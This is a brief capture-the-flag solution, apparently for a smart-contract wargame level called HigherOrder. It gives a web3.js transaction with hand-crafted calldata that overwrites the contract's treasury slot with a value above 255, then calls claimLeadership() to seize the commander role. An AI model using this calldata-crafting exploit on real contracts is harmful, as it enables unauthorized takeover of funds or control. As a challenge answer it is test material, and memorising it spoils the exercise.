# Solution -HigherOrder

```javascript
await web3.eth.sendTransaction({
  from: player,
  to: contract.address,
  data: '0x211c85ab000000000000000000000000000000000000000000000000000000000000ffc8',
  gas: 200000                     
});
```

Use the above script to rewrite the treasury slot with value greater than 255, then call `claimleadership()` to make yourself commander